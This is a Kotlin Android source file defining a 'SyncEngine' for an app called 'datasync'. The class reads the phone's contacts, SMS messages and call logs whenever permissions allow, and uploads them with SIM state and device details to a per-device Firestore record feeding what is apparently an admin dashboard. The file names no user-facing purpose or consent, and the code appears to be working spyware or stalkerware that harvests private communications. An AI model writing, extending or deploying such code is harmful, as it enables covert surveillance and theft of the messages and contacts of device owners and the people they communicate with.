package com.boxx.datasync.sync

import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.util.Log
import androidx.core.content.ContextCompat
import androidx.preference.PreferenceManager
import com.boxx.datasync.domain.repository.DataRepository
import com.boxx.datasync.utils.DataHelper
import com.boxx.datasync.utils.DeviceIdHelper
import com.google.firebase.firestore.FirebaseFirestore
import kotlinx.coroutines.tasks.await
import javax.inject.Inject
import javax.inject.Singleton

sealed class SyncResult {
    object Success : SyncResult()
    data class Error(val message: String) : SyncResult()
    object PermissionMissing : SyncResult()
}

@Singleton
class SyncEngine @Inject constructor(
    private val repository: DataRepository
) {
    suspend fun runSync(context: Context, isFullSync: Boolean): SyncResult {
        Log.d("SyncEngine", "SYNC_ENGINE_STARTED isFullSync=$isFullSync")

        val deviceId = DeviceIdHelper.getDeviceId(context)
        val prefs = PreferenceManager.getDefaultSharedPreferences(context)
        val now = System.currentTimeMillis()

        try {
            repository.updateDeviceInfoMap(deviceId, baseDeviceMap(deviceId, now) + mapOf(
                "syncStatus" to "Syncing",
                "lastError" to null
            ))

            val lastSmsSync = if (isFullSync) 0L else prefs.getLong("last_sms_sync", 0L)
            val lastCallSync = if (isFullSync) 0L else prefs.getLong("last_call_sync", 0L)
            val lastContactSync = if (isFullSync) 0L else prefs.getLong("last_contact_sync", 0L)

            val contactsAllowed = hasPermission(context, android.Manifest.permission.READ_CONTACTS)
            val smsAllowed = hasPermission(context, android.Manifest.permission.READ_SMS)
            val callsAllowed = hasPermission(context, android.Manifest.permission.READ_CALL_LOG)

            Log.d("SyncEngine", "SYNC_ENGINE_PERMISSION_STATUS contacts=$contactsAllowed sms=$smsAllowed calls=$callsAllowed")

            if (!contactsAllowed && !smsAllowed && !callsAllowed) {
                repository.updateDeviceInfoMap(deviceId, baseDeviceMap(deviceId, now) + mapOf(
                    "syncStatus" to "Error",
                    "lastError" to "Missing data permissions",
                    "lastSyncTime" to now
                ))
                return SyncResult.PermissionMissing
            }

            Log.d("SyncEngine", "SYNC_UPLOAD_STARTED")

            val contacts = if (contactsAllowed) DataHelper.fetchContacts(context, sinceTimestamp = lastContactSync) else emptyList()
            val sms = if (smsAllowed) DataHelper.fetchSMS(context, sinceTimestamp = lastSmsSync) else emptyList()
            val calls = if (callsAllowed) DataHelper.fetchCallLogs(context, sinceTimestamp = lastCallSync) else emptyList()

            repository.syncIncremental(deviceId, contacts, sms, calls)

            prefs.edit().apply {
                if (contacts.isNotEmpty()) putLong("last_contact_sync", now)
                if (sms.isNotEmpty()) putLong("last_sms_sync", sms.maxOfOrNull { it.date } ?: now)
                if (calls.isNotEmpty()) putLong("last_call_sync", calls.maxOfOrNull { it.date } ?: now)
            }.apply()

            val simState = DataHelper.getSimState(context)

            val notificationCount = try {
                FirebaseFirestore.getInstance().collection("devices").document(deviceId)
                    .collection("notifications").get().await().size()
            } catch (e: Exception) {
                0
            }

            repository.updateDeviceInfoMap(deviceId, baseDeviceMap(deviceId, System.currentTimeMillis()) + simState + mapOf(
                "lastSyncTime" to System.currentTimeMillis(),
                "syncStatus" to "Synced",
                "lastError" to null,
                "contactCount" to if (contactsAllowed) DataHelper.fetchContacts(context).size else 0,
                "smsCount" to if (smsAllowed) DataHelper.fetchSMS(context).size else 0,
                "callCount" to if (callsAllowed) DataHelper.fetchCallLogs(context).size else 0,
                "notificationCount" to notificationCount
            ))

            Log.d("SyncEngine", "SYNC_UPLOAD_SUCCESS")
            Log.d("SyncEngine", "ADMIN_REALTIME_UPDATED")
            return SyncResult.Success
        } catch (e: Exception) {
            val message = e.localizedMessage ?: e.message ?: e.javaClass.simpleName
            Log.e("SyncEngine", "SYNC_UPLOAD_FAILED", e)
            try {
                repository.updateDeviceInfoMap(deviceId, baseDeviceMap(deviceId, System.currentTimeMillis()) + mapOf(
                    "lastSyncTime" to System.currentTimeMillis(),
                    "syncStatus" to "Error",
                    "lastError" to message
                ))
            } catch (_: Exception) {}
            return SyncResult.Error(message)
        }
    }

    private fun hasPermission(context: Context, permission: String) =
        ContextCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED

    private fun baseDeviceMap(deviceId: String, now: Long): Map<String, Any?> = mapOf(
        "deviceId" to deviceId,
        "deviceName" to "${Build.MANUFACTURER} ${Build.MODEL}",
        "manufacturer" to Build.MANUFACTURER,
        "model" to Build.MODEL,
        "osVersion" to Build.VERSION.RELEASE,
        "heartbeatAt" to now,
        "timestamp" to now
    )
}
